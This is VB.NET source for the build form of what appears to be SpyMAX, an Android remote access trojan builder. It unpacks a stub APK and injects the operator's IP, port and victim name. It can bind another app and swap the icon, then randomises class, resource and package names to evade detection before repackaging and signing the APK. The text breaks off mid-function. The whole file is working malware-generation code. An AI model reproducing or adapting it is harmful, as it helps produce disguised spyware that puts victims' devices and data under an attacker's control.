Public Class Build


    Private _Time As Integer = 5

    Private _Bitmap_ICO As Bitmap = Nothing

    Private cou As Integer = 0

    Private spl_arguments As String = "[x0b0x]"

    Private ip, ports, namevictim, namepatch, version, proprty, sleepms, futex, flavor, iconPatch As String

    Private folder_building, folder_apktool, path_apktool, path_Apk, path_font, BIND_Path, BIND_EX, intent_, xPackage As String

    Private ftx As String()

    Private vulTrack As Integer = 0

    Private pack1 As String = "package"

    Private pack2 As String = "name"

    Private Const spymax As String = "spymax"

    Private Const stub7 As String = "stub7"

    '##
    Private Const ClassGen0 As String = "ClassGen0"
    Private Const ClassGen1 As String = "ClassGen1"
    Private Const ClassGen2 As String = "ClassGen2"
    Private Const ClassGen3 As String = "ClassGen3"
    Private Const ClassGen4 As String = "ClassGen4"
    Private Const ClassGen5 As String = "ClassGen5"
    Private Const ClassGen6 As String = "ClassGen6"
    'Private Const ClassGen7 As String = "ClassGen7"
    Private Const ClassGen8 As String = "ClassGen8"
    Private Const ClassGen9 As String = "ClassGen9"
    Private Const ClassGen10 As String = "ClassGen10"
    Private Const ClassGen11 As String = "ClassGen11"
    Private Const ClassGen12 As String = "ClassGen12"
    Private Const ClassGen13 As String = "ClassGen13"
    Private Const ClassGen14 As String = "ClassGen14"
    Private NClassGen0 As String = "QQ0"
    Private NClassGen1 As String = "QQ1"
    Private NClassGen2 As String = "QQ2"
    Private NClassGen3 As String = "QQ3"
    Private NClassGen4 As String = "QQ4"
    Private NClassGen5 As String = "QQ5"
    Private NClassGen6 As String = "QQ6"
    'Private NClassGen7 As String = "QQ7"
    Private NClassGen8 As String = "QQ8"
    Private NClassGen9 As String = "QQ9"
    Private NClassGen10 As String = "QQ10"
    Private NClassGen11 As String = "QQ11"
    Private NClassGen12 As String = "QQ12"
    Private NClassGen13 As String = "QQ13"
    Private NClassGen14 As String = "QQ14"
    '##
    Private payload As String = "payload"
    '##

    Private Const resoString0 As String = "j1j2j3j4j5j6"
    Private Const resoString1 As String = "c1c2c3c4c5c6"
    Private Const resoString2 As String = "z1z2z3z4z5z6"
    Private Const resoString3 As String = "f1f2f3f4f5f6"
    Private Const resoString4 As String = "h1h2h3h4h5h6"
    Private Const resoString5 As String = "t1t2t3t4t5t6"
    Private Const resoString6 As String = "n1n2n3n4n5n6"
    Private Const resoString7 As String = "i1i2i3i4i5i6"
    Private Const resoString8 As String = "k1k2k3k4k5k6"
    Private Const resoString9 As String = "o1o2o3o4o5o6"
    Private Const resoString10 As String = "u1u2u3u4u5u6"
    Private Const resoString11 As String = "e1e2e3e4e5e6"
    Private Const resoString12 As String = "y1y2y3y4y5y6"
    Private NresoString0 As String = "str0"
    Private NresoString1 As String = "str1"
    Private NresoString2 As String = "str2"
    Private NresoString3 As String = "str3"
    Private NresoString4 As String = "str4"
    Private NresoString5 As String = "str5"
    Private NresoString6 As String = "str6"
    Private NresoString7 As String = "str7"
    Private NresoString8 As String = "str8"
    Private NresoString9 As String = "str9"
    Private NresoString10 As String = "str10"
    Private NresoString11 As String = "str11"
    Private NresoString12 As String = "str12"

    Private Const app_reso0 As String = "b1b2b3b4b5b6"
    Private Napp_reso0 As String = "app0"

    Private Const draw_ico As String = "d1d2d3d4d5d6"
    Private Const draw_notifi As String = "x1x2x3x4x5x6"
    Private Ndraw_ico As String = "ico0"
    Private Ndraw_notifi As String = "ico1"

    Private Const webXML As String = "q1q2q3q4q5q6"
    Private NwebXML As String = "web0"

    Private Const notifiXML As String = "s1s2s3s4s5s6"
    Private NnotifiXML As String = "noti8"

    Private Sub EncryRando_notifiXML() '// MAX 255
        Dim min As Integer = 5
        Dim max As Integer = 25
        NnotifiXML = RandomString(min, max).ToString.ToLower
    End Sub

    Private Sub EncryRando_webXML() '// MAX 255
        Dim min As Integer = 5
        Dim max As Integer = 25
        NwebXML = RandomString(min, max).ToString.ToLower
    End Sub

    Private Sub EncryRando_drawable() '// MAX 255
        Dim min As Integer = 5
        Dim max As Integer = 25
        Ndraw_ico = RandomString(min, max).ToString.ToLower
        Ndraw_notifi = RandomString(min, max).ToString.ToLower
    End Sub

    Private Sub EncryRando_app_reso() '// MAX 255
        Dim min As Integer = 5
        Dim max As Integer = 25
        Napp_reso0 = RandomString(min, max)
    End Sub

    Private Sub EncryRandoreso()

        Dim min As Integer = 10
        Dim max As Integer = 25
        NresoString0 = RandomString(min, max)
        NresoString1 = RandomString(min, max)
        NresoString2 = RandomString(min, max)
        NresoString3 = RandomString(min, max)
        NresoString4 = RandomString(min, max)
        NresoString5 = RandomString(min, max)
        NresoString6 = RandomString(min, max)
        NresoString7 = RandomString(min, max)
        NresoString8 = RandomString(min, max)
        NresoString9 = RandomString(min, max)
        NresoString10 = RandomString(min, max)
        NresoString11 = RandomString(min, max)
        NresoString12 = RandomString(min, max)

    End Sub

    Private Sub EncryRando()

        Dim min As Integer = 10
        Dim max As Integer = 100
        NClassGen0 = RandomString(min, max)
        NClassGen1 = RandomString(min, max)
        NClassGen2 = RandomString(min, max)
        NClassGen3 = RandomString(min, max)
        NClassGen4 = RandomString(min, max)
        NClassGen5 = RandomString(min, max)
        NClassGen6 = RandomString(min, max)
        'NClassGen7 = RandomString(min, max)
        NClassGen8 = RandomString(min, max)
        NClassGen9 = RandomString(min, max)
        NClassGen10 = RandomString(min, max)
        NClassGen11 = RandomString(min, max)
        NClassGen12 = RandomString(min, max)
        NClassGen13 = RandomString(min, max)
        NClassGen14 = RandomString(min, max)
        payload = RandomString(min, max)
    End Sub
    Private Function GenerateRandomNumber(ByVal m0 As Integer, ByVal m1 As Integer) As Integer
        Static Random_Number As New Random()
        Return Random_Number.Next(m0, m1)
    End Function
    Function RandomString(minCharacters As Integer, maxCharacters As Integer)
        Dim s As String = "abcdefghijklmnopqrstuvwxyz"
        Static r As New Random
        Dim chactersInString As Integer = r.Next(minCharacters, maxCharacters)
        Dim sb As New System.Text.StringBuilder
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        cou += 1
        Return sb.ToString() & CStr(cou)
    End Function

    Private Sub t_Tick(sender As Object, e As EventArgs) Handles t.Tick

        PG.Value = vulTrack

        If PG.Value = PG.Maximum Then

            If Not PG.Style = ProgressBarStyle.Marquee Then

                PG.Style = ProgressBarStyle.Marquee

                PG.MarqueeAnimationSpeed = 30

            End If

        End If

        If Builtapk = True Then

            PG.Style = ProgressBarStyle.Blocks

            PG.Value = 0

            t.Enabled = False

        End If
    End Sub

    Private Const tempApk As String = "temp"

    Public Property ZipFile As Object

    Private CMD As Object

    Private start As System.DateTime

    Private Font8 As Font = Nothing

    Private Status_Text As String = "..."

    Private colBack As Color = Color.FromArgb(31, 31, 31)

    Public colForeg As Color = Color.White


    Private Sub KillA()
        Try
            Process.GetProcessesByName("java")(0).Kill()
        Catch xd0 As Exception
        End Try
        Try
            Process.GetProcessesByName("cmd")(0).Kill()
        Catch xd1 As Exception
        End Try
    End Sub
    Private Sub Build_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Threading.ThreadPool.SetMaxThreads(250, 250)

        Threading.ThreadPool.SetMinThreads(250, 250)

        KillA()

        Try

            Dim arguments As String = Command()

            If Not arguments = Nothing Then

                cou = GenerateRandomNumber(0, 5000)

                Ti1.Interval = 33

                Ti1.Enabled = True

                Ti2.Enabled = True

                Dim spl As String() = arguments.Split({spl_arguments}, StringSplitOptions.None)

                ip = spl(0)

                ports = spl(1)

                namevictim = FixStrings(spl(2))

                namepatch = FixStrings(spl(3))

                version = spl(4)

                proprty = spl(5)

                sleepms = spl(6)

                futex = spl(7)

                ftx = futex.Split({"-"}, StringSplitOptions.None)

                path_apktool = spl(8)

                path_Apk = spl(9)

                path_font = spl(10)

                flavor = spl(11)

                Dim sColor As String() = spl(12).Split("|")
                Dim vColor1 As String() = sColor(0).Split(",")
                Dim vColor2 As String() = sColor(1).Split(",")

                colBack = Color.FromArgb(CInt(vColor1(0)), CInt(vColor1(1)), CInt(vColor1(2)))
                virusBox.BackColor = colBack
                colForeg = Color.FromArgb(CInt(vColor2(0)), CInt(vColor2(1)), CInt(vColor2(2)))


                iconPatch = spl(13)

                If IO.File.Exists(iconPatch) Then

                    _Bitmap_ICO = New Bitmap(iconPatch)

                End If

                BIND_Path = spl(16)

                BIND_EX = spl(17)

                intent_ = FixStrings(spl(18))

                xPackage = spl(19)

                If xPackage.Contains(".") Then

                    Dim ar As String() = xPackage.Split(".")

                    pack1 = ar(0)

                    pack2 = ar(1)

                End If

                EncryRando()

                EncryRandoreso()

                EncryRando_app_reso()

                EncryRando_drawable()

                EncryRando_webXML()

                EncryRando_notifiXML()

                Dim F0ntStyle As FontStyle = FontStyle.Regular
                    Dim ttFont As String = "Hack-Regular.ttf"
                    Select Case spl(14)
                        Case "Bold"
                            F0ntStyle = FontStyle.Bold
                            ttFont = "Hack-Bold.ttf"
                        Case "Regular"
                            F0ntStyle = FontStyle.Regular
                            ttFont = "Hack-Regular.ttf"
                        Case Else
                            F0ntStyle = FontStyle.Regular
                            ttFont = "Hack-Regular.ttf"
                    End Select

                    Dim F0ntSize As Integer = CInt(spl(15))

                    Font8 = CustomFont.LoadFont(F0ntSize, F0ntStyle, path_font & ttFont)

                    start = System.DateTime.Now()

                    vulTrack = 10

                    t.Enabled = True

                    Dim th0 As System.Threading.Thread = New Threading.Thread(AddressOf Step1)

                    th0.IsBackground = True

                    th0.Start()

                Else

                    Me.Close()

            End If

            DoubleBuffered = True

            PrepareCircles()

        Catch ex As Exception

            'MsgBox(ex.ToString, MsgBoxStyle.Exclamation, Text)

        End Try

    End Sub


    Private Function FixStrings(ByVal str As String) As String


        Dim c0 As String = "&"
        Dim p0 As String = "&amp;"

        Dim c1 As String = "<"
        Dim p1 As String = "&lt;"

        Dim c2 As String = """"
        Dim p2 As String = "\"""

        Dim c3 As String = "'"
        Dim p3 As String = "\'"

        Dim c4 As String = "?"
        Dim p4 As String = "\?"

        Dim c5 As String = "@"
        Dim p5 As String = "\@"

        If str.Contains(c0) Then
            If Not str.Contains(p0) Then
                str = str.Replace(c0, p0)
            End If
        End If


        If str.Contains(c1) Then
            If Not str.Contains(p1) Then
                str = str.Replace(c1, p1)
            End If
        End If

        If str.Contains(c2) Then
            If Not str.Contains(p2) Then
                str = str.Replace(c2, p2)
            End If
        End If

        If str.Contains(c3) Then
            If Not str.Contains(p3) Then
                str = str.Replace(c3, p3)
            End If
        End If

        If str.Contains(c4) Then
            If Not str.Contains(p4) Then
                str = str.Replace(c4, p4)
            End If
        End If

        If str.Contains(c5) Then
            If Not str.Contains(p5) Then
                str = str.Replace(c5, p5)
            End If
        End If
        Return str

    End Function
    Private Sub Step1()

        Dim driv As String = GetDriv()

Back0:

        Threading.Thread.Sleep(_Time)

        folder_building = driv & "SpyMAX-2v_32-64Bit"

        If Environment.Is64BitOperatingSystem Then

            folder_apktool = driv & "SpyMAX-2v_32-64Bit" & "\platformBinary64\bin"
        Else

            folder_apktool = driv & "SpyMAX-2v_32-64Bit" & "\platformBinary32\bin"
        End If




        Try

            If Not IO.Directory.Exists(folder_building) Then

                IO.Directory.CreateDirectory(folder_building)

                GoTo Back0

            End If

            vulTrack = 20

            If Not IO.Directory.Exists(folder_apktool) Then

                IO.Directory.CreateDirectory(folder_apktool)

                GoTo Back0

            End If

            vulTrack = 30

            If IO.Directory.Exists(folder_apktool) Then

                Try

                    If IO.Directory.GetFiles(folder_apktool, "*.*").Count = 0 Then

                        File_zip_Decompress(path_apktool, folder_building)

                    End If

                Catch ex As Exception

                End Try

            End If

            vulTrack = 35
Back1:

            Threading.Thread.Sleep(_Time)

            If IO.Directory.Exists(folder_building) And IO.Directory.Exists(folder_apktool) Then

                Try

                    Dim path As String = folder_apktool & "\" & tempApk

                    If IO.Directory.Exists(folder_apktool & "\" & tempApk) Then

                        System.IO.Directory.Delete(path, True)

                    End If

                    If System.IO.File.Exists(folder_apktool & "\" & tempApk & ".apk") Then

                        System.IO.File.Delete(folder_apktool & "\" & tempApk & ".apk")

                    End If

                    If System.IO.File.Exists(folder_apktool & "\output\ready.apk") Then

                        System.IO.File.Delete(folder_apktool & "\output\ready.apk")

                    End If

                    System.IO.File.Copy(path_Apk, folder_apktool & "\" & tempApk & ".apk", True)

                    Dim canRun As Boolean = CMD_running()

                    If canRun Then

                        vulTrack = 40

                        CMD.StandardInput.WriteLine("cd " & folder_apktool) ' ادخل في مسار

                        CMD.StandardInput.WriteLine("java -version") 'تحقق من وجود جافا java -version

                    End If

                Catch ex As Exception

                    GoTo Back1

                End Try

            End If

        Catch ex As Exception

            Me.Close()

        End Try

    End Sub

    Public Function GetDriv() As String

        Try

            Dim f() As String = {"\"}

            Dim a() As String = Application.StartupPath.Split(f, StringSplitOptions.RemoveEmptyEntries)

            Return a(0).ToString & "\"

        Catch

            Return "C:\"

        End Try

    End Function
    Private Sub File_zip_Decompress(zipPath As String, pathfolder As String)

        If Not System.IO.Directory.Exists(pathfolder) Then

            System.IO.Directory.CreateDirectory(pathfolder)

        End If

        System.IO.Compression.ZipFile.ExtractToDirectory(zipPath, pathfolder)

    End Sub

    Private Function CMD_running() As Boolean

        Try

            CMD = New Process

            CMD.StartInfo.RedirectStandardOutput = True

            CMD.StartInfo.RedirectStandardInput = True

            CMD.StartInfo.RedirectStandardError = True

            CMD.StartInfo.FileName = "cmd.exe"

            AddHandler CType(CMD, Process).OutputDataReceived, AddressOf Sync_Output

            AddHandler CType(CMD, Process).ErrorDataReceived, AddressOf Sync_Output

            AddHandler CType(CMD, Process).Exited, AddressOf ex

            CMD.StartInfo.UseShellExecute = False

            CMD.StartInfo.CreateNoWindow = True

            CMD.StartInfo.WindowStyle = ProcessWindowStyle.Hidden

            CMD.EnableRaisingEvents = True

            CMD.Start()

            CMD.BeginOutputReadLine()

            CMD.BeginErrorReadLine()

            Return True

        Catch ex As Exception

            Return False

        End Try

    End Function

    Private FolderApk As Boolean = False
    Private Builtapk As Boolean = False
    Delegate Sub Delegate0(ByVal d0 As Object, b0 As Object)
    Public Sub Sync_Output(ByVal d01 As Object, ByVal b01 As Object)
        Try

            If Me.InvokeRequired Then

                Dim iInvoke As New Delegate0(AddressOf Sync_Output)

                Me.Invoke(iInvoke, New Object() {d01, b01})

                Exit Sub

            Else

                If Not String.IsNullOrEmpty(b01.Data) Then

                    Threading.Thread.Sleep(1)

                    If b01.Data.ToString.Contains("OpenJDK") Then ' OK

                        CMD.StandardInput.WriteLine("apktool d " & tempApk & ".apk") ' فك تغليف

                    ElseIf b01.Data.ToString.Contains("java -jar SignApk.jar") Or b01.Data.ToString.Contains("java -jar " & folder_apktool & "\SignApk.jar ") Then 'OK

                        'جاهز
                        Step3()

                    ElseIf b01.Data.ToString.Contains("Copying original files") Then 'OK

                        'انتظر حتى تنتهي من فك التغليف

                        Dim th1 As System.Threading.Thread = New Threading.Thread(AddressOf Step2)

                        th1.IsBackground = True

                        th1.Start()

                    ElseIf b01.Data.ToString.Contains("Built apk") Then 'OK
                        ' انتظر حتى يتم الانتهاء من تغليف الملف 

                        CMD.StandardInput.WriteLine("java -jar " & folder_apktool & "\SignApk.jar " & folder_apktool & "\certificate.pem " & folder_apktool & "\key.pk8 " & folder_apktool & "\" & tempApk & "\dist\" & tempApk & ".apk " & folder_apktool & "\output\ready" & ".apk") ' توقيعك

                        FolderApk = True

                        Status_Text = "0/5"

                    End If

                    If FolderApk = False Then

                        If b01.Data.ToString.StartsWith("I:") Then ' نجاح

                            Dim tmp As String = b01.Data.ToString

                            Status_Text = tmp.Replace("I:", "")

                            'S:تحذيرات 
                            'W:اخطاء

                        End If

                    End If


                End If

            End If

        Catch ex As Exception
        End Try

    End Sub

    Private Sub ex()
        MsgBox("cmd.exe Unexpectedly closed !!", MsgBoxStyle.Critical, "spymax")
        Try
            Close_cmd()
        Catch ex As Exception
        Finally
            End
        End Try
    End Sub

    Private Sub Close_cmd()

        Application.ExitThread()

        CMD.CancelOutputRead()

        CMD.CancelErrorRead()

        CMD.Kill()

        CMD.Close()

        End

    End Sub

    Private Sub Step2()
        While True
Back0:
            Threading.Thread.Sleep(_Time)

            Dim p As String = folder_apktool & "\" & tempApk & "\res\values\strings.xml"

            Dim yml As String = folder_apktool & "\" & tempApk & "\apktool.yml"

            Dim AndroidManifest As String = folder_apktool & "\" & tempApk & "\AndroidManifest.xml"

            Dim public_xml As String = folder_apktool & "\" & tempApk & "\res\values\public.xml"

            Dim web_xml As String = folder_apktool & "\" & tempApk & "\res\layout\" & webXML & ".xml"

            Dim notifi_xml As String = folder_apktool & "\" & tempApk & "\res\layout\" & notifiXML & ".xml"

            If System.IO.File.Exists(p) Then

                vulTrack = 50

                Try

                    Dim readall As String = IO.File.ReadAllText(p) _
                    .Replace("[SPY_MAX_IP]", ip) _
                    .Replace("[SPY_MAX_PORT]", ports) _
                    .Replace("[SPY_MAX_NAME_VICTIM]", namevictim) _
                    .Replace("[SPY_MAX_NAME_PATCH]", namepatch) _
                    .Replace("[SPY_MAX_NAME_VERSION]", version) _
                    .Replace("[SPY_MAX_PROPERTY]", proprty) _
                    .Replace("[SPY_MAX_SLEEP]", sleepms) _
                    .Replace("[SPY_MAX_FUT0EX]", ftx(0)) _
                    .Replace("[SPY_MAX_FUT1EX]", ftx(1)) _
                    .Replace("[SPY_MAX_FUT2EX]", ftx(2)) _
                    .Replace("[SPY_MAX_FUT3EX]", ftx(3)) _
                    .Replace("[SPY_MAX_BIND]", BIND_EX) _
                    .Replace("[SPY_MAX_INTENT]", intent_) _
                    .Replace(resoString0, NresoString0) _
                    .Replace(resoString1, NresoString1) _
                    .Replace(resoString2, NresoString2) _
                    .Replace(resoString3, NresoString3) _
                    .Replace(resoString4, NresoString4) _
                    .Replace(resoString5, NresoString5) _
                    .Replace(resoString6, NresoString6) _
                    .Replace(resoString7, NresoString7) _
                    .Replace(resoString8, NresoString8) _
                    .Replace(resoString9, NresoString9) _
                    .Replace(resoString10, NresoString10) _
                    .Replace(resoString11, NresoString11) _
                    .Replace(resoString12, NresoString12) _
                    .Replace(app_reso0, Napp_reso0) _
                    .Replace(draw_ico, Ndraw_ico) _
                    .Replace(draw_notifi, Ndraw_notifi) _
                    .Replace(webXML, NwebXML) _
                    .Replace(notifiXML, NnotifiXML)

                    IO.File.WriteAllText(p, readall)

                    vulTrack = 60
Back1:

                    Threading.Thread.Sleep(_Time)

                    If System.IO.File.Exists(yml) Then

                        Dim readyml As String = IO.File.ReadAllText(yml)

                        If readyml.Contains("[SPY_MAX_NAME_VERSION]") Then

                            readyml = readyml.Replace("[SPY_MAX_NAME_VERSION]", version)

                            IO.File.WriteAllText(yml, readyml)

                        End If

                    Else

                        Threading.Thread.Sleep(_Time)

                        GoTo Back1

                    End If

                    vulTrack = 65
Back2:

                    Threading.Thread.Sleep(_Time)

                    If System.IO.File.Exists(AndroidManifest) Then

                        Dim readManifest As String = IO.File.ReadAllText(AndroidManifest)

                        If readManifest.Contains(".suffix") Then

                            readManifest = readManifest _
                                 .Replace(".suffix", flavor).Replace(spymax, pack1).Replace(stub7, pack2) _
                                 .Replace(ClassGen0, NClassGen0) _
                                 .Replace(ClassGen1, NClassGen1) _
                                 .Replace(ClassGen2, NClassGen2) _
                                 .Replace(ClassGen3, NClassGen3) _
                                 .Replace(ClassGen4, NClassGen4) _
                                 .Replace(ClassGen5, NClassGen5) _
                                 .Replace(ClassGen6, NClassGen6) _
                                 .Replace(ClassGen8, NClassGen8) _
                                 .Replace(ClassGen9, NClassGen9) _
                                 .Replace(ClassGen10, NClassGen10) _
                                 .Replace(ClassGen11, NClassGen11) _
                                 .Replace(ClassGen12, NClassGen12) _
                                 .Replace(ClassGen13, NClassGen13) _
                                 .Replace(ClassGen14, NClassGen14) _
                                 .Replace(resoString0, NresoString0) _
                                 .Replace(resoString1, NresoString1) _
                                 .Replace(resoString2, NresoString2) _
                                 .Replace(resoString3, NresoString3) _
                                 .Replace(resoString4, NresoString4) _
                                 .Replace(resoString5, NresoString5) _
                                 .Replace(resoString6, NresoString6) _
                                 .Replace(resoString7, NresoString7) _
                                 .Replace(resoString8, NresoString8) _
                                 .Replace(resoString9, NresoString9) _
                                 .Replace(resoString10, NresoString10) _
                                 .Replace(resoString11, NresoString11) _
                                 .Replace(resoString12, NresoString12) _
                                 .Replace(app_reso0, Napp_reso0) _
                                 .Replace(draw_ico, Ndraw_ico) _
                                 .Replace(draw_notifi, Ndraw_notifi) _
                                 .Replace(webXML, NwebXML) _
                                 .Replace(notifiXML, NnotifiXML)


                            IO.File.WriteAllText(AndroidManifest, readManifest)

                        End If

                    Else

                        Threading.Thread.Sleep(_Time)

                        GoTo Back2

                    End If

                    vulTrack = 70

Back3:
                    Dim pNotifi_2 As String = folder_apktool & "\" & tempApk & "\res\drawable\" & draw_notifi & ".png"

                    If System.IO.File.Exists(pNotifi_2) Then

                        My.Computer.FileSystem.RenameFile(pNotifi_2, Ndraw_notifi & ".png")

                    Else

                        Threading.Thread.Sleep(_Time)

                        GoTo Back3

                    End If


                    If Not iconPatch = "null" Then

                        If System.IO.File.Exists(iconPatch) Then

Back4:
                            Threading.Thread.Sleep(_Time)

                            Dim picoPatch As String = folder_apktool & "\" & tempApk & "\res\drawable\" & draw_ico & ".png"

                            If System.IO.File.Exists(picoPatch) Then

                                System.IO.File.Delete(picoPatch)

                                System.IO.File.Copy(iconPatch, folder_apktool & "\" & tempApk & "\res\drawable\" & Ndraw_ico & ".png", True)

                            Else

                                Threading.Thread.Sleep(_Time)

                                GoTo Back4

                            End If

                        End If

                    Else

L1:
                        Dim picoPatch_2 As String = folder_apktool & "\" & tempApk & "\res\drawable\" & draw_ico & ".png"

                        If System.IO.File.Exists(picoPatch_2) Then

                            My.Computer.FileSystem.RenameFile(picoPatch_2, Ndraw_ico & ".png")

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo L1

                        End If

                    End If

                    If Not BIND_Path = "null" Then

                        If System.IO.File.Exists(BIND_Path) Then

Back5:
                            Threading.Thread.Sleep(_Time)

                            Dim b As String = folder_apktool & "\" & tempApk & "\res\raw\" & app_reso0

                            If System.IO.File.Exists(b) Then

                                System.IO.File.Delete(b)

                                System.IO.File.Copy(BIND_Path, folder_apktool & "\" & tempApk & "\res\raw\" & Napp_reso0, True)

                            Else

                                Threading.Thread.Sleep(_Time)

                                GoTo Back5

                            End If

                        End If

                    Else

L0:
                        Dim b As String = folder_apktool & "\" & tempApk & "\res\raw\" & app_reso0

                        If System.IO.File.Exists(b) Then

                            My.Computer.FileSystem.RenameFile(b, Napp_reso0)

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo L0

                        End If

                    End If



Back6:
                    Try

                        Dim folder_smali As String = folder_apktool & "\" & tempApk & "\smali\" & spymax & "\" & stub7

                        If IO.Directory.Exists(folder_smali) Then

                            Dim FileDirectory As New IO.DirectoryInfo(folder_smali)

                            Dim smi As IO.FileInfo() = FileDirectory.GetFiles("*.smali")

                            For Each di In smi

                                Dim smali As String = IO.File.ReadAllText(di.FullName)

                                If di.Name.ToLower = ("buildconfig.smali") Then
                                    smali = smali.Replace("payload", payload) _
                                    .Replace(".suffix", flavor) _
                                    .Replace(spymax, pack1) _
                                    .Replace(stub7, pack2) _
                                    .Replace(resoString0, NresoString0) _
                                    .Replace(resoString1, NresoString1) _
                                    .Replace(resoString2, NresoString2) _
                                    .Replace(resoString3, NresoString3) _
                                    .Replace(resoString4, NresoString4) _
                                    .Replace(resoString5, NresoString5) _
                                    .Replace(resoString6, NresoString6) _
                                    .Replace(resoString7, NresoString7) _
                                    .Replace(resoString8, NresoString8) _
                                    .Replace(resoString9, NresoString9) _
                                    .Replace(resoString10, NresoString10) _
                                    .Replace(resoString11, NresoString11) _
                                    .Replace(resoString12, NresoString12) _
                                    .Replace(app_reso0, Napp_reso0) _
                                    .Replace(draw_ico, Ndraw_ico) _
                                    .Replace(draw_notifi, Ndraw_notifi) _
                                    .Replace(webXML, NwebXML) _
                                    .Replace(notifiXML, NnotifiXML)


                                Else
                                    smali = smali.Replace(spymax, pack1).Replace(stub7, pack2) _
                                    .Replace(ClassGen0, NClassGen0) _
                                    .Replace(ClassGen1, NClassGen1) _
                                    .Replace(ClassGen2, NClassGen2) _
                                    .Replace(ClassGen3, NClassGen3) _
                                    .Replace(ClassGen4, NClassGen4) _
                                    .Replace(ClassGen5, NClassGen5) _
                                    .Replace(ClassGen6, NClassGen6) _
                                    .Replace(ClassGen8, NClassGen8) _
                                    .Replace(ClassGen9, NClassGen9) _
                                    .Replace(ClassGen10, NClassGen10) _
                                    .Replace(ClassGen11, NClassGen11) _
                                    .Replace(ClassGen12, NClassGen12) _
                                    .Replace(ClassGen13, NClassGen13) _
                                    .Replace(ClassGen14, NClassGen14) _
                                    .Replace(resoString0, NresoString0) _
                                    .Replace(resoString1, NresoString1) _
                                    .Replace(resoString2, NresoString2) _
                                    .Replace(resoString3, NresoString3) _
                                    .Replace(resoString4, NresoString4) _
                                    .Replace(resoString5, NresoString5) _
                                    .Replace(resoString6, NresoString6) _
                                    .Replace(resoString7, NresoString7) _
                                    .Replace(resoString8, NresoString8) _
                                    .Replace(resoString9, NresoString9) _
                                    .Replace(resoString10, NresoString10) _
                                    .Replace(resoString11, NresoString11) _
                                    .Replace(resoString12, NresoString12) _
                                    .Replace(app_reso0, Napp_reso0) _
                                    .Replace(draw_ico, Ndraw_ico) _
                                    .Replace(draw_notifi, Ndraw_notifi) _
                                    .Replace(webXML, NwebXML) _
                                    .Replace(notifiXML, NnotifiXML)

                                End If




                                IO.File.WriteAllText(di.FullName, smali)

                            Next

                            FileIO.FileSystem.RenameDirectory(folder_apktool & "\" & tempApk & "\smali\" & spymax & "\" & stub7, pack2)

                            FileIO.FileSystem.RenameDirectory(folder_apktool & "\" & tempApk & "\smali\" & spymax, pack1)

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo Back6

                        End If


                    Catch ex As Exception

                        Threading.Thread.Sleep(_Time)

                        GoTo Back6

                    End Try


Back7:
                    Try

                        If IO.File.Exists(public_xml) Then
                            Dim pub_xml As String = IO.File.ReadAllText(public_xml) _
                            .Replace(resoString0, NresoString0) _
                            .Replace(resoString1, NresoString1) _
                            .Replace(resoString2, NresoString2) _
                            .Replace(resoString3, NresoString3) _
                            .Replace(resoString4, NresoString4) _
                            .Replace(resoString5, NresoString5) _
                            .Replace(resoString6, NresoString6) _
                            .Replace(resoString7, NresoString7) _
                            .Replace(resoString8, NresoString8) _
                            .Replace(resoString9, NresoString9) _
                            .Replace(resoString10, NresoString10) _
                            .Replace(resoString11, NresoString11) _
                            .Replace(resoString12, NresoString12) _
                            .Replace(app_reso0, Napp_reso0) _
                            .Replace(draw_ico, Ndraw_ico) _
                            .Replace(draw_notifi, Ndraw_notifi) _
                            .Replace(webXML, NwebXML) _
                            .Replace(notifiXML, NnotifiXML)
                            IO.File.WriteAllText(public_xml, pub_xml)

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo Back7

                        End If


                    Catch ex As Exception

                        Threading.Thread.Sleep(_Time)

                        GoTo Back7

                    End Try


Back8:
                    Try

                        If IO.File.Exists(web_xml) Then

                            My.Computer.FileSystem.RenameFile(web_xml, NwebXML & ".xml")

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo Back8

                        End If


                    Catch ex As Exception

                        Threading.Thread.Sleep(_Time)

                        GoTo Back8

                    End Try



Back9:
                    Try

                        If IO.File.Exists(notifi_xml) Then

                            My.Computer.FileSystem.RenameFile(notifi_xml, NnotifiXML & ".xml")

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo Back9

                        End If


                    Catch ex As Exception

                        Threading.Thread.Sleep(_Time)

                        GoTo Back9

                    End Try



                    vulTrack = 80

                    CMD.StandardInput.WriteLine("apktool b -f -r " & tempApk) ' اعادة تغليف

                    Exit While

                Catch ex As Exception

                    Threading.Thread.Sleep(_Time)

                    GoTo Back0

                End Try


            Else

                Threading.Thread.Sleep(_Time)

                GoTo Back0

            End If


            Threading.Thread.Sleep(_Time)

        End While

    End Sub

    Private Async Sub Step3()

        While True

            Threading.Thread.Sleep(1)

            Dim ncPath As String = folder_apktool & "\output\ready" & ".apk"

            If System.IO.File.Exists(ncPath) Then

                vulTrack = 85

                Dim finish As System.DateTime = System.DateTime.Now()

                Dim span As System.TimeSpan = finish - start

                Dim sb As New Text.StringBuilder

                sb.AppendLine("+----------- informations -----------+")

                sb.AppendLine("idle time:" & " minutes " & span.Minutes & " seconds " & span.Seconds & " milliseconds " & span.Milliseconds)

                sb.AppendLine("name patch:" & namepatch)

                sb.AppendLine("version:" & version)


                If ports.Contains(":") Then

                    sb.AppendLine("DNS/ip:port")

                    Dim i As String() = ip.Split({":"}, StringSplitOptions.None)

                    Dim p As String() = ports.Split({":"}, StringSplitOptions.None)

                    For u As Integer = 0 To p.Length - 1

                        sb.AppendLine(i(u) & ":" & p(u))

                    Next

                Else

                    sb.AppendLine("DNS/ip:" & ip)

                    sb.AppendLine("port:" & ports)

                End If

                sb.AppendLine("+-----------      end     -----------+")
Back0:

                Threading.Thread.Sleep(1)

                If IO.File.Exists(folder_apktool & "\output\info.inf") Then

                    IO.File.WriteAllText(folder_apktool & "\output\info.inf", sb.ToString)

                Else

                    Dim fs As IO.FileStream = IO.File.Create(folder_apktool & "\output\info.inf")

                    fs.Close()

                    Threading.Thread.Sleep(1)

                    GoTo Back0

                End If

                vulTrack = 100

                Await Task.Factory.StartNew(Sub() OKY(), TaskCreationOptions.None)

                Builtapk = True

                Exit While

            End If

        End While

    End Sub
    Private Sub OKY()

        If FolderApk = True Then

            For i As Integer = 0 To 5
                Threading.Thread.Sleep(1000)
                Status_Text = CStr(i) & "/5"
            Next

